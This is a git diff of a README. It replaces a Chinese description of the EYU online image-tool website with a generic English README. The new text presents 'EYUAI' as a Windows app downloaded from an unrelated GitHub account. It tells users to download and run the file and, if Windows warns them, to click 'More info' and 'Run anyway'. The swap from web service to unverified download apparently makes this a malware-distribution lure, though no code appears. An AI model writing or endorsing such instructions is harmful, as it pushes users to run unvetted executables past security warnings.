@@ -1,76 +1,219 @@
-# EYU图片助手 - 一站式免费在线AI生图、改图与识图智能工具平台
+# ✨ EYUAI - Simple AI tools for images
 
-[![Website](https://img.shields.io/badge/Website-EYU图片助手-blue?style=for-the-badge&logo=google-chrome)](https://www.eyuseo.com/zh/)
-[![Status](https://img.shields.io/badge/Status-Online_&_Free-success?style=for-the-badge)](#)
-[![Models](https://img.shields.io/badge/Models-Flux_|_Qwen_|_Nano_|_Seadream-orange?style=for-the-badge)](#)
+[![Download EYUAI](https://img.shields.io/badge/Download-EYUAI-blue?style=for-the-badge&logo=github)](https://github.com/Defeated-wash894/EYUAI)
 
-[**EYU图片助手 (EYU Image Assistant)**](https://www.eyuseo.com/zh/) 是一款专为专业创作者与日常图像处理需求打造的免费在线智能 AI 图片工具。我们打破了单一模型的局限，创新性地集成了 **Flux**、**Nano Banana Pro**、**Seadream4.5** 及 **Qwen-Image-Edit** 等全球顶尖大模型。
+## 🚀 Getting Started
 
-无需繁琐的本地部署和昂贵的显卡算力，只需打开浏览器，即可体验高质量 AI 生图、指令式 AI 改图及极速 AI 识图功能。
+EYUAI is a Windows app for AI image work. It helps you make images, edit them, read text from images, and identify content in photos.
 
-🔗 **官方体验地址：** [https://www.eyuseo.com/zh/](https://www.eyuseo.com/zh/)
+Use it if you want one app for tasks like:
+- Text to image
+- Image editing
+- Image recognition
+- OCR text capture
+- AI image tasks with modern models
 
---
+## 📥 Download and Install
 
-## 🌟 核心功能与集成模型
+To get EYUAI, visit this page to download:
+https://github.com/Defeated-wash894/EYUAI
 
-EYU图片助手内置“智能调度大脑”，可根据您的自然语言提示词（Prompt）自动为您匹配最合适的底层模型：
+After you open the page:
 
-### 1. 🎨 AI 生图：Flux 模型驱动
-集成目前行业顶尖的 **Flux 高质量生图模型**。具备卓越的指令遵循能力，轻松驾驭复杂的纹理、精准的手指绘制、文字生成以及逼真的光影场景。无论是写实摄影还是赛博朋克风格，细节极致呈现。
+1. Look for the latest release or download file.
+2. Download the Windows version.
+3. Open the file you downloaded.
+4. Follow the steps on screen.
+5. Launch EYUAI from your desktop or Start menu.
 
-### 2. ✂️ AI 改图：Qwen-Image-Edit 智能编辑
-支持“听得懂人话”的对话式指令修图。只需输入如“把背景换成雪山”、“移除路人”或“将红色衣服改成蓝色”等自然语言指令，AI 即可精准理解语义并完成局部重绘与无缝融合。
+If the file is a ZIP package:
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Open the extracted folder.
+4. Double-click the app file to start it.
 
-### 3. 🔍 AI 识图：Nano Banana Pro 极速视觉解析
-搭载轻量化、毫秒级响应的 **Nano Banana Pro 视觉大模型**。为您的工作流提供极速视觉支持，功能涵盖：精准物体识别、复杂场景分析、标签分类以及高精度的 OCR 文字提取。
+If Windows shows a security prompt:
+1. Click More info.
+2. Click Run anyway if you trust the source.
 
-### 4. 🚀 艺术渲染与批量并发：Seadream 4.5
-专为创意设计和艺术渲染优化的 **Seadream 4.5 模型**。提供丰富的梦幻风格预设，并支持强大的云端并发算力，允许同时对多张图片进行批量生图或改图操作，保持高度的风格统一。
+## 🖥️ What You Need
 
----
+EYUAI works best on a modern Windows PC.
 
-## 💡 为什么选择 EYU 图片工具？
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A recent Intel or AMD processor
+- Enough free disk space for the app and model files
+- Internet access for download and model setup
 
-- **一站式全能工作流**：无需在多个 AI 平台间切换，从 Flux 生成底图 -> Qwen 局部修改 -> Nano 标签提取，全流程闭环。
-- **开箱即用的免部署体验**：所有复杂模型均在云端运行，配置要求为零，免费在线即刻使用。
-- **多模型风格融合**：结合 Flux 的细节与 Seadream4.5 的创意，一键实现动漫、油画、水彩等风格迁移。
-- **EYU 智能助手**：内置提示词（Prompt）优化专家，自动将简短描述扩展为专业级提示词，让 AI 新手也能产出大师级画作。
+For better image generation:
+- A dedicated graphics card helps
+- More memory gives smoother performance
+- More free space helps with large AI models
 
----
+## 🧠 What EYUAI Can Do
 
-## 📖 快速开始 (How to Use)
+EYUAI focuses on common AI image tasks.
 
-体验由 Flux 与 Nano Banana Pro 驱动的 AI 流程，只需简单四步：
+You can use it to:
+- Generate images from text prompts
+- Edit images with AI tools
+- Identify objects in photos
+- Read text from screenshots or documents
+- Work with modern vision and language models
+- Run image-related tasks in one place
 
-1. **选择 AI 模式**：访问 [EYU主页](https://www.eyuseo.com/zh/)，根据需求选择：Flux (生图)、Qwen (改图)、Nano (识图)。
-2. **输入指令**：输入您的提示词。例如：“赛博朋克风格街道” 或 “提取图表中的数据”。
-3. **配置参数 (可选)**：针对高级用户，可微调重绘幅度或选择 Seadream 艺术渲染风格。
-4. **极速获取作品**：点击“开始处理”，云端高并发集群将极速运行，并返回高清图像或结构化分析报告。
+## 🪟 First Run
 
----
+When you open EYUAI for the first time, the app may need a short setup step.
 
-## ❓ 常见问题 (FAQ)
+Do this:
+1. Start the app.
+2. Wait for any first-time loading.
+3. Choose your language or basic settings if asked.
+4. Connect to the model you want to use if the app asks for it.
+5. Try a simple prompt or image upload.
 
-**Q: EYU图片助手是否免费开放？**
-A: 是的，EYU图片助手目前提供免费的基础服务，您可以直接在线体验各种先进模型，无需繁琐部署。
+Good first test:
+- Type a short prompt like: A cat on a sofa
+- Or upload a photo and ask the app to read the text in it
 
-**Q: Flux 模型在 AI 生图方面有什么优势？**
-A: Flux 具备卓越的指令遵循能力和细节表现力，尤其在生成手指、嵌入准确的文字和处理复杂光影场景时，表现远超传统模型。
+## 🧭 How to Use It
 
-**Q: Qwen-Image-Edit 如何实现改图？**
-A: 它支持自然语言交互。您无需掌握复杂的遮罩（Mask）技术，只需用文字告诉它“把苹果变成橘子”，它就能理解并精准修改图像。
+### 🎨 Make an Image
 
-**Q: 上传的图片隐私如何保障？**
-A: 我们极度重视用户隐私。上传至 EYU 助手的图像仅用于当次云端推理，处理完成后系统会按规定自动清除，绝不用于训练其他模型。
+1. Open the text-to-image section.
+2. Type what you want to see.
+3. Choose image size if the app offers it.
+4. Click the generate button.
+5. Save the result when it looks right.
 
----
+Example prompts:
+- A small red house in winter
+- A robot standing in a city street
+- A clean product photo on a white background
 
-## 🌐 访问网站
+### 🖼️ Edit an Image
 
-立即探索更多强大的 AI 图像处理功能，提升您的创作效率：
+1. Open the image editing tool.
+2. Load your image.
+3. Choose the edit type.
+4. Describe the change you want.
+5. Review the result and save it.
 
-**👉 [点击开启 EYU 图片助手之旅](https://www.eyuseo.com/zh/)**
+Common edits:
+- Remove a background
+- Change a color
+- Improve image quality
+- Add or remove objects
 
----
-*注：本仓库用于介绍和引导使用 EYU 图片助手在线平台。生成的图片版权归属遵循各开源模型（如 Flux、Qwen 等）的协议及平台使用条款。*
+### 🔍 Recognize an Image
+
+1. Open the image recognition tool.
+2. Upload a photo.
+3. Ask what is in the image.
+4. Read the response.
+5. Copy or save the result if needed.
+
+Use this for:
+- Object checks
+- Scene checks
+- Quick visual search tasks
+
+### 📝 OCR Text Reading
+
+1. Open the OCR tool.
+2. Upload a screenshot, scan, or photo.
+3. Let the app process the image.
+4. Copy the text it finds.
+5. Fix any scan errors by checking the source image.
+
+OCR works well for:
+- Receipts
+- Screenshots
+- Notes
+- Printed pages
+
+## 🧩 Tips for Better Results
+
+For text to image:
+- Keep prompts clear and short
+- Mention the main subject first
+- Add style details only if needed
+
+For OCR:
+- Use a clear image
+- Make sure the text is not blurry
+- Crop extra space if the app allows it
+
+For image recognition:
+- Use bright, sharp photos
+- Keep the main subject in view
+- Avoid very dark images
+
+## 📁 File and Model Setup
+
+EYUAI may use local files and model folders to handle AI tasks.
+
+Good practice:
+- Keep the app in a stable folder
+- Avoid moving files after setup
+- Store models in a folder with enough space
+- Use short folder names when possible
+
+If the app asks for a model path:
+1. Open the folder selector.
+2. Choose the model file or model folder.
+3. Save the setting.
+4. Restart the app if needed.
+
+## ⚙️ Basic Troubleshooting
+
+If the app does not open:
+- Try running it again
+- Restart Windows
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if it came in one
+
+If the app opens but feels slow:
+- Close other apps
+- Free up memory
+- Use smaller image sizes
+- Try a lighter model if one is available
+
+If OCR gives poor text:
+- Use a sharper image
+- Increase image contrast
+- Try a better crop of the text area
+
+If image generation fails:
+- Check your internet connection
+- Try a shorter prompt
+- Pick a different model or setting
+- Make sure enough disk space is free
+
+## 🔐 Privacy and Local Use
+
+EYUAI may work with local files on your PC.
+
+Keep in mind:
+- Your images can stay on your computer
+- You can choose what to upload or open
+- Save only the files you want to keep
+- Review the app settings before using cloud features, if any
+
+## 📌 Main Link
+
+Download and setup start here:
+https://github.com/Defeated-wash894/EYUAI
+
+## 🗂️ Quick Steps
+
+1. Open the download page
+2. Get the Windows file
+3. Install or extract it
+4. Start EYUAI
+5. Pick a tool
+6. Upload an image or enter text
+7. Save your result
